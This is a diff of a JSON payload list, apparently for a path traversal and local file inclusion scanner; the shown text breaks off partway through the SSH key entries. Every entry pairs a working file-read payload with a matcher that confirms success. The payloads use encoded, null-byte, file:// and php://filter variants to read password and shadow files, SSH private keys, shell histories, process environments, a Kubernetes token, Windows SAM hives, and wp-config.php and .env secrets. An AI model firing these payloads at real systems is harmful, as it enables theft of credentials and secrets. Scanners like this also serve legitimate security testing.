@@ -1,101 +1,1914 @@
 [
-  {"category": "linux-passwd",    "target_os": "linux",   "severity": "critical", "cvss": "9.8", "payload": "/etc/passwd",                                                "matcher": "root:[x*]?:0:0"},
-  {"category": "linux-passwd",    "target_os": "linux",   "severity": "critical", "cvss": "9.8", "payload": "../../../../../../etc/passwd",                              "matcher": "root:[x*]?:0:0"},
-  {"category": "linux-passwd",    "target_os": "linux",   "severity": "critical", "cvss": "9.8", "payload": "../../../../../../../../etc/passwd",                        "matcher": "root:[x*]?:0:0"},
-  {"category": "linux-passwd",    "target_os": "linux",   "severity": "critical", "cvss": "9.8", "payload": "....//....//....//....//etc/passwd",                        "matcher": "root:[x*]?:0:0"},
-  {"category": "linux-passwd",    "target_os": "linux",   "severity": "critical", "cvss": "9.8", "payload": "..%2f..%2f..%2f..%2fetc%2fpasswd",                          "matcher": "root:[x*]?:0:0"},
-  {"category": "linux-passwd",    "target_os": "linux",   "severity": "critical", "cvss": "9.8", "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",                  "matcher": "root:[x*]?:0:0"},
-  {"category": "linux-passwd",    "target_os": "linux",   "severity": "critical", "cvss": "9.8", "payload": "file:///etc/passwd",                                        "matcher": "root:[x*]?:0:0"},
-
-  {"category": "linux-shadow",    "target_os": "linux",   "severity": "critical", "cvss": "9.8", "payload": "/etc/shadow",                                                "matcher": "root:\\$\\d+\\$"},
-  {"category": "linux-shadow",    "target_os": "linux",   "severity": "critical", "cvss": "9.8", "payload": "../../../../../../etc/shadow",                              "matcher": "root:\\$\\d+\\$"},
-  {"category": "linux-shadow",    "target_os": "linux",   "severity": "critical", "cvss": "9.8", "payload": "../../../../../../etc/master.passwd",                       "matcher": "root:"},
-
-  {"category": "linux-hosts",     "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/etc/hosts",                                                 "matcher": "(127\\.0\\.0\\.1\\s+localhost|::1\\s+localhost)"},
-  {"category": "linux-hosts",     "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "../../../../../../etc/hosts",                               "matcher": "(127\\.0\\.0\\.1\\s+localhost|::1\\s+localhost)"},
-  {"category": "linux-resolv",    "target_os": "linux",   "severity": "medium",   "cvss": "5.3", "payload": "/etc/resolv.conf",                                           "matcher": "nameserver\\s+\\d+\\."},
-  {"category": "linux-resolv",    "target_os": "linux",   "severity": "medium",   "cvss": "5.3", "payload": "../../../../../../etc/resolv.conf",                         "matcher": "nameserver\\s+\\d+\\."},
-  {"category": "linux-fstab",     "target_os": "linux",   "severity": "medium",   "cvss": "5.3", "payload": "/etc/fstab",                                                 "matcher": "(UUID=|/dev/)"},
-  {"category": "linux-issue",     "target_os": "linux",   "severity": "low",      "cvss": "3.1", "payload": "/etc/issue",                                                 "matcher": "(Ubuntu|Debian|CentOS|Red Hat|Alpine|Kali)"},
-  {"category": "linux-issue",     "target_os": "linux",   "severity": "low",      "cvss": "3.1", "payload": "/etc/os-release",                                            "matcher": "(NAME=|VERSION=|ID=)"},
-  {"category": "linux-issue",     "target_os": "linux",   "severity": "low",      "cvss": "3.1", "payload": "/etc/lsb-release",                                           "matcher": "DISTRIB_ID="},
-
-  {"category": "linux-ssh",       "target_os": "linux",   "severity": "critical", "cvss": "9.8", "payload": "/root/.ssh/id_rsa",                                          "matcher": "-----BEGIN .*PRIVATE KEY-----"},
-  {"category": "linux-ssh",       "target_os": "linux",   "severity": "critical", "cvss": "9.8", "payload": "/home/admin/.ssh/id_rsa",                                    "matcher": "-----BEGIN .*PRIVATE KEY-----"},
-  {"category": "linux-ssh",       "target_os": "linux",   "severity": "critical", "cvss": "9.8", "payload": "/home/ubuntu/.ssh/id_rsa",                                   "matcher": "-----BEGIN .*PRIVATE KEY-----"},
-  {"category": "linux-ssh",       "target_os": "linux",   "severity": "critical", "cvss": "9.8", "payload": "/home/ec2-user/.ssh/id_rsa",                                 "matcher": "-----BEGIN .*PRIVATE KEY-----"},
-  {"category": "linux-ssh",       "target_os": "linux",   "severity": "critical", "cvss": "9.8", "payload": "/var/lib/postgresql/.ssh/id_rsa",                            "matcher": "-----BEGIN .*PRIVATE KEY-----"},
-  {"category": "linux-ssh",       "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/root/.ssh/authorized_keys",                                 "matcher": "(ssh-rsa|ssh-ed25519|ecdsa-sha2)"},
-  {"category": "linux-ssh",       "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/home/admin/.ssh/authorized_keys",                           "matcher": "(ssh-rsa|ssh-ed25519|ecdsa-sha2)"},
-  {"category": "linux-ssh",       "target_os": "linux",   "severity": "medium",   "cvss": "5.3", "payload": "/root/.ssh/known_hosts",                                     "matcher": "(ssh-rsa|ecdsa-sha2|ssh-ed25519)"},
-
-  {"category": "linux-history",   "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/root/.bash_history",                                        "matcher": "(sudo|ssh|curl|wget|export|psql|mysql)"},
-  {"category": "linux-history",   "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/home/admin/.bash_history",                                  "matcher": "(sudo|ssh|curl|wget)"},
-  {"category": "linux-history",   "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/home/ubuntu/.bash_history",                                 "matcher": "(sudo|ssh|curl|wget)"},
-  {"category": "linux-history",   "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/root/.zsh_history",                                         "matcher": "(sudo|ssh|curl|wget)"},
-  {"category": "linux-history",   "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/root/.mysql_history",                                       "matcher": "(SELECT|INSERT|GRANT|DROP)"},
-  {"category": "linux-history",   "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/root/.psql_history",                                        "matcher": "(SELECT|INSERT|GRANT|DROP)"},
-
-  {"category": "proc-self",       "target_os": "linux",   "severity": "critical", "cvss": "9.1", "payload": "/proc/self/environ",                                         "matcher": "(HTTP_|PATH=|HOSTNAME=)"},
-  {"category": "proc-self",       "target_os": "linux",   "severity": "critical", "cvss": "9.1", "payload": "../../../../../../proc/self/environ",                       "matcher": "(HTTP_|PATH=|HOSTNAME=)"},
-  {"category": "proc-self",       "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/proc/self/cmdline",                                         "matcher": "(/usr/|/bin/|--port|--config)"},
-  {"category": "proc-self",       "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/proc/self/status",                                          "matcher": "(Name:|Pid:|Uid:|VmSize:)"},
-  {"category": "proc-self",       "target_os": "linux",   "severity": "medium",   "cvss": "5.3", "payload": "/proc/self/maps",                                            "matcher": "[0-9a-f]+-[0-9a-f]+\\s+[rwxp]"},
-  {"category": "proc-self",       "target_os": "linux",   "severity": "medium",   "cvss": "5.3", "payload": "/proc/version",                                              "matcher": "(Linux version|gcc)"},
-  {"category": "proc-self",       "target_os": "linux",   "severity": "medium",   "cvss": "5.3", "payload": "/proc/mounts",                                               "matcher": "(/dev/|tmpfs|rw,)"},
-  {"category": "proc-self",       "target_os": "linux",   "severity": "low",      "cvss": "3.7", "payload": "/proc/cpuinfo",                                              "matcher": "(processor|cpu MHz|model name)"},
-  {"category": "proc-self",       "target_os": "linux",   "severity": "low",      "cvss": "3.7", "payload": "/proc/meminfo",                                              "matcher": "(MemTotal:|MemFree:)"},
-
-  {"category": "var-log",         "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/var/log/auth.log",                                          "matcher": "(sshd|Accepted|Failed)"},
-  {"category": "var-log",         "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/var/log/secure",                                            "matcher": "(sshd|Accepted|Failed)"},
-  {"category": "var-log",         "target_os": "linux",   "severity": "medium",   "cvss": "5.3", "payload": "/var/log/syslog",                                            "matcher": "([A-Z][a-z]{2}\\s+\\d+\\s+\\d+:\\d+:\\d+|kernel:)"},
-  {"category": "var-log",         "target_os": "linux",   "severity": "medium",   "cvss": "5.3", "payload": "/var/log/messages",                                          "matcher": "([A-Z][a-z]{2}\\s+\\d+\\s+\\d+:\\d+:\\d+|kernel:)"},
-  {"category": "var-log",         "target_os": "linux",   "severity": "medium",   "cvss": "5.3", "payload": "/var/log/dpkg.log",                                          "matcher": "(install|configure|status)"},
-  {"category": "var-log",         "target_os": "linux",   "severity": "medium",   "cvss": "5.3", "payload": "/var/log/apt/history.log",                                   "matcher": "(Start-Date|Install|Commandline)"},
-  {"category": "var-log",         "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/var/log/apache2/access.log",                                "matcher": "(HTTP/1\\.[01]|GET\\s|POST\\s)"},
-  {"category": "var-log",         "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/var/log/apache2/error.log",                                 "matcher": "(\\[error\\]|\\[Wed|\\[Mon|\\[Sun|\\[Tue|\\[Thu|\\[Fri|\\[Sat)"},
-  {"category": "var-log",         "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/var/log/nginx/access.log",                                  "matcher": "(HTTP/1\\.[01]|GET\\s|POST\\s)"},
-  {"category": "var-log",         "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/var/log/nginx/error.log",                                   "matcher": "(\\[error\\]|\\[crit\\])"},
-
-  {"category": "config",          "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/etc/nginx/nginx.conf",                                      "matcher": "(server\\s*\\{|http\\s*\\{|worker_processes)"},
-  {"category": "config",          "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/etc/nginx/sites-enabled/default",                          "matcher": "(server\\s*\\{|server_name)"},
-  {"category": "config",          "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/etc/apache2/apache2.conf",                                  "matcher": "(ServerRoot|DocumentRoot|LoadModule)"},
-  {"category": "config",          "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/etc/httpd/conf/httpd.conf",                                 "matcher": "(ServerRoot|DocumentRoot|LoadModule)"},
-  {"category": "config",          "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/etc/php/8.2/apache2/php.ini",                               "matcher": "(\\[PHP\\]|memory_limit|allow_url_fopen)"},
-  {"category": "config",          "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/etc/php/8.1/fpm/php.ini",                                   "matcher": "(\\[PHP\\]|memory_limit)"},
-  {"category": "config",          "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/etc/mysql/my.cnf",                                          "matcher": "(\\[mysqld\\]|\\[client\\]|datadir)"},
-  {"category": "config",          "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/etc/postgresql/14/main/postgresql.conf",                   "matcher": "(listen_addresses|max_connections|data_directory)"},
-  {"category": "config",          "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/etc/redis/redis.conf",                                      "matcher": "(bind\\s+\\d+\\.|protected-mode)"},
-  {"category": "config",          "target_os": "linux",   "severity": "critical", "cvss": "9.1", "payload": "/etc/shadow-",                                                "matcher": "root:\\$\\d+\\$"},
-
-  {"category": "cloud-meta",      "target_os": "any",     "severity": "critical", "cvss": "9.8", "payload": "/.dockerenv",                                                 "matcher": "."},
-  {"category": "cloud-meta",      "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/proc/1/cgroup",                                              "matcher": "(docker|kubepods|cri-)"},
-  {"category": "cloud-meta",      "target_os": "linux",   "severity": "high",     "cvss": "7.5", "payload": "/run/secrets/kubernetes.io/serviceaccount/token",            "matcher": "ey[A-Za-z0-9_-]+\\.ey[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"},
-
-  {"category": "windows-ini",     "target_os": "windows", "severity": "medium",   "cvss": "5.3", "payload": "C:\\\\Windows\\\\win.ini",                                   "matcher": "(\\[fonts\\]|\\[extensions\\]|for 16-bit app support)"},
-  {"category": "windows-ini",     "target_os": "windows", "severity": "medium",   "cvss": "5.3", "payload": "../../../../../../Windows/win.ini",                          "matcher": "(\\[fonts\\]|\\[extensions\\])"},
-  {"category": "windows-ini",     "target_os": "windows", "severity": "medium",   "cvss": "5.3", "payload": "../../../../../../boot.ini",                                 "matcher": "\\[boot loader\\]"},
-  {"category": "windows-ini",     "target_os": "windows", "severity": "medium",   "cvss": "5.3", "payload": "C:/Windows/system.ini",                                       "matcher": "\\[386Enh\\]"},
-  {"category": "windows-ini",     "target_os": "windows", "severity": "medium",   "cvss": "5.3", "payload": "..\\\\..\\\\..\\\\Windows\\\\win.ini",                       "matcher": "\\[fonts\\]"},
-
-  {"category": "windows-sam",     "target_os": "windows", "severity": "critical", "cvss": "9.8", "payload": "C:\\\\Windows\\\\System32\\\\config\\\\SAM",                "matcher": ".*"},
-  {"category": "windows-sam",     "target_os": "windows", "severity": "critical", "cvss": "9.8", "payload": "C:\\\\Windows\\\\repair\\\\SAM",                            "matcher": ".*"},
-  {"category": "windows-sam",     "target_os": "windows", "severity": "critical", "cvss": "9.8", "payload": "C:\\\\Windows\\\\System32\\\\config\\\\SYSTEM",             "matcher": ".*"},
-
-  {"category": "null-byte",       "target_os": "any",     "severity": "high",     "cvss": "7.5", "payload": "/etc/passwd%00",                                              "matcher": "root:[x*]?:0:0"},
-  {"category": "null-byte",       "target_os": "any",     "severity": "high",     "cvss": "7.5", "payload": "/etc/passwd%00.jpg",                                          "matcher": "root:[x*]?:0:0"},
-  {"category": "null-byte",       "target_os": "any",     "severity": "high",     "cvss": "7.5", "payload": "../../../../../../etc/passwd%00.png",                       "matcher": "root:[x*]?:0:0"},
-
-  {"category": "double-encoded",  "target_os": "any",     "severity": "high",     "cvss": "7.5", "payload": "..%252f..%252f..%252fetc%252fpasswd",                       "matcher": "root:[x*]?:0:0"},
-  {"category": "double-encoded",  "target_os": "any",     "severity": "high",     "cvss": "7.5", "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",                  "matcher": "root:[x*]?:0:0"},
-  {"category": "double-encoded",  "target_os": "any",     "severity": "high",     "cvss": "7.5", "payload": "%252e%252e%252f%252e%252e%252fetc%252fpasswd",              "matcher": "root:[x*]?:0:0"},
-  {"category": "double-encoded",  "target_os": "any",     "severity": "high",     "cvss": "7.5", "payload": "..%c0%af..%c0%af..%c0%afetc/passwd",                       "matcher": "root:[x*]?:0:0"},
-
-  {"category": "php-filter",      "target_os": "linux",   "severity": "critical", "cvss": "9.1", "payload": "php://filter/convert.base64-encode/resource=index.php",      "matcher": "<\\?php"},
-  {"category": "php-filter",      "target_os": "linux",   "severity": "critical", "cvss": "9.1", "payload": "php://filter/convert.base64-encode/resource=config.php",     "matcher": "<\\?php"},
-  {"category": "php-filter",      "target_os": "linux",   "severity": "critical", "cvss": "9.1", "payload": "php://filter/convert.base64-encode/resource=wp-config.php",  "matcher": "<\\?php"},
-  {"category": "php-filter",      "target_os": "linux",   "severity": "critical", "cvss": "9.1", "payload": "php://filter/convert.base64-encode/resource=database.php",   "matcher": "<\\?php"},
-  {"category": "php-filter",      "target_os": "linux",   "severity": "critical", "cvss": "9.1", "payload": "php://filter/read=convert.base64-encode/resource=.env",      "matcher": "."},
-  {"category": "php-filter",      "target_os": "linux",   "severity": "critical", "cvss": "9.1", "payload": "php://filter/zlib.deflate/convert.base64-encode/resource=index.php", "matcher": "."},
-  {"category": "php-filter",      "target_os": "linux",   "severity": "critical", "cvss": "9.1", "payload": "php://filter/convert.iconv.utf-8.utf-16le/resource=index.php","matcher": "."}
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "../etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "../../etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "../../../etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "../../../../etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "../../../../../etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "../../../../../../etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "../../../../../../../etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "../../../../../../../../etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "../../../../../../../../../../etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "../../../../../../../../../../../../etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "....//....//....//....//etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "....\\/....\\/....\\/etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "..%2f..%2f..%2f..%2fetc%2fpasswd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "..%c0%af..%c0%af..%c0%afetc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "..%252f..%252f..%252fetc%252fpasswd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "..%5c..%5c..%5cetc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "..//..//..//etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/../../../../../../../../../../etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "file:///etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "file://localhost/etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/etc/./passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/etc//passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/etc/passwd%00",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/etc/passwd%00.jpg",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "../../../../../../etc/passwd%00.png",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "..%00/etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/proc/self/root/etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/etc/passwd#",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-passwd",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "....////....////etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "linux-shadow",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/etc/shadow",
+    "matcher": "root:\\$\\d+\\$"
+  },
+  {
+    "category": "linux-shadow",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "../../../../../../etc/shadow",
+    "matcher": "root:\\$\\d+\\$"
+  },
+  {
+    "category": "linux-shadow",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "../../../../../../../../etc/shadow",
+    "matcher": "root:\\$\\d+\\$"
+  },
+  {
+    "category": "linux-shadow",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "..%2f..%2f..%2f..%2fetc%2fshadow",
+    "matcher": "root:\\$\\d+\\$"
+  },
+  {
+    "category": "linux-shadow",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "file:///etc/shadow",
+    "matcher": "root:\\$\\d+\\$"
+  },
+  {
+    "category": "linux-shadow",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/etc/shadow-",
+    "matcher": "root:\\$\\d+\\$"
+  },
+  {
+    "category": "linux-shadow",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/etc/gshadow",
+    "matcher": "root:\\$\\d+\\$"
+  },
+  {
+    "category": "linux-shadow",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/etc/security/passwd",
+    "matcher": "root:\\$\\d+\\$"
+  },
+  {
+    "category": "linux-shadow",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "../../../../../../etc/master.passwd",
+    "matcher": "root:"
+  },
+  {
+    "category": "linux-hosts",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/hosts",
+    "matcher": "(127\\.0\\.0\\.1\\s+localhost|::1\\s+localhost)"
+  },
+  {
+    "category": "linux-hosts",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "../../../../../../etc/hosts",
+    "matcher": "(127\\.0\\.0\\.1\\s+localhost|::1\\s+localhost)"
+  },
+  {
+    "category": "linux-hosts",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "..%2f..%2f..%2f..%2fetc%2fhosts",
+    "matcher": "(127\\.0\\.0\\.1\\s+localhost|::1\\s+localhost)"
+  },
+  {
+    "category": "linux-hosts",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "file:///etc/hosts",
+    "matcher": "(127\\.0\\.0\\.1\\s+localhost|::1\\s+localhost)"
+  },
+  {
+    "category": "linux-hosts",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/hostname",
+    "matcher": "[a-zA-Z0-9.-]+"
+  },
+  {
+    "category": "linux-resolv",
+    "target_os": "linux",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "/etc/resolv.conf",
+    "matcher": "nameserver\\s+\\d+\\."
+  },
+  {
+    "category": "linux-resolv",
+    "target_os": "linux",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "../../../../../../etc/resolv.conf",
+    "matcher": "nameserver\\s+\\d+\\."
+  },
+  {
+    "category": "linux-fstab",
+    "target_os": "linux",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "/etc/fstab",
+    "matcher": "(UUID=|/dev/)"
+  },
+  {
+    "category": "linux-fstab",
+    "target_os": "linux",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "../../../../../../etc/fstab",
+    "matcher": "(UUID=|/dev/)"
+  },
+  {
+    "category": "linux-fstab",
+    "target_os": "linux",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "/etc/mtab",
+    "matcher": "(/dev/|tmpfs|proc)"
+  },
+  {
+    "category": "linux-issue",
+    "target_os": "linux",
+    "severity": "low",
+    "cvss": "3.1",
+    "payload": "/etc/issue",
+    "matcher": "(Ubuntu|Debian|CentOS|Red Hat|Alpine|Kali)"
+  },
+  {
+    "category": "linux-issue",
+    "target_os": "linux",
+    "severity": "low",
+    "cvss": "3.1",
+    "payload": "/etc/os-release",
+    "matcher": "(NAME=|VERSION=|ID=)"
+  },
+  {
+    "category": "linux-issue",
+    "target_os": "linux",
+    "severity": "low",
+    "cvss": "3.1",
+    "payload": "/etc/lsb-release",
+    "matcher": "DISTRIB_ID="
+  },
+  {
+    "category": "linux-issue",
+    "target_os": "linux",
+    "severity": "low",
+    "cvss": "3.1",
+    "payload": "/etc/debian_version",
+    "matcher": "\\d+\\.\\d+|sid|trixie|bookworm"
+  },
+  {
+    "category": "linux-issue",
+    "target_os": "linux",
+    "severity": "low",
+    "cvss": "3.1",
+    "payload": "/etc/redhat-release",
+    "matcher": "(Red Hat|CentOS|Fedora|Rocky|AlmaLinux)"
+  },
+  {
+    "category": "linux-issue",
+    "target_os": "linux",
+    "severity": "low",
+    "cvss": "3.1",
+    "payload": "/etc/motd",
+    "matcher": ".+"
+  },
+  {
+    "category": "linux-ssh",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/root/.ssh/id_rsa",
+    "matcher": "-----BEGIN .*PRIVATE KEY-----"
+  },
+  {
+    "category": "linux-ssh",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/root/.ssh/id_ed25519",
+    "matcher": "-----BEGIN .*PRIVATE KEY-----"
+  },
+  {
+    "category": "linux-ssh",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/root/.ssh/id_ecdsa",
+    "matcher": "-----BEGIN .*PRIVATE KEY-----"
+  },
+  {
+    "category": "linux-ssh",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/root/.ssh/id_dsa",
+    "matcher": "-----BEGIN .*PRIVATE KEY-----"
+  },
+  {
+    "category": "linux-ssh",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/home/admin/.ssh/id_rsa",
+    "matcher": "-----BEGIN .*PRIVATE KEY-----"
+  },
+  {
+    "category": "linux-ssh",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/home/ubuntu/.ssh/id_rsa",
+    "matcher": "-----BEGIN .*PRIVATE KEY-----"
+  },
+  {
+    "category": "linux-ssh",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/home/ec2-user/.ssh/id_rsa",
+    "matcher": "-----BEGIN .*PRIVATE KEY-----"
+  },
+  {
+    "category": "linux-ssh",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/home/user/.ssh/id_rsa",
+    "matcher": "-----BEGIN .*PRIVATE KEY-----"
+  },
+  {
+    "category": "linux-ssh",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/home/git/.ssh/id_rsa",
+    "matcher": "-----BEGIN .*PRIVATE KEY-----"
+  },
+  {
+    "category": "linux-ssh",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/var/lib/postgresql/.ssh/id_rsa",
+    "matcher": "-----BEGIN .*PRIVATE KEY-----"
+  },
